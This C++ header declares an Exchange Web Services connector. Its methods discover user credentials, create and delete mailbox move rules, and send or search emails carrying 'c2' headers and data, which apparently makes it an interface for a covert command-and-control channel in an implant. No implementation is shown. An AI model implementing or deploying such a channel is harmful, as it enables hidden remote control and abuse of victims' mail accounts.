#pragma once
#include <Windows.h>
#include <string>

typedef struct _CREDENTIALS {
	LPWSTR domain[256];
	LPWSTR username[256];
	LPWSTR password[256];
} CREDENTIALS, * PCREDENTIALS;

class EWSConnector {

private:
	HANDLE hInternet;
	HANDLE hConnection;
	BOOL usingSSL = FALSE;

	std::string endpoint;
	std::string server;
	std::string ewsPath;
	std::string mailbox;

	// Initialize with oldest supported version
	std::string version = "Exchange2013";

	BOOL DiscoverParameters();
	BOOL DiscoverCredentials();
	BOOL MakeRequest(std::string body, std::string& response);

public:

	BOOL Initialize();
	BOOL DoesRuleExist(LPCSTR ruleName);
	BOOL CreateMoveRule(LPCSTR ruleName, LPCSTR fromEmail, LPCSTR folderName);
	BOOL DeleteRule(LPCSTR ruleName);
	BOOL SendEmailWithHeader(LPCSTR toEmail, LPCSTR c2_Header, LPCSTR c2_Data);

	BOOL SearchEmail(LPCSTR fromEmail, LPCSTR folderName, std::string &mimeContent);
	BOOL SearchEmailAndExtractHeader(LPCSTR fromEmail, LPCSTR folderName, LPCSTR headerName, std::string &content);

	EWSConnector() { }
	~EWSConnector() { }
};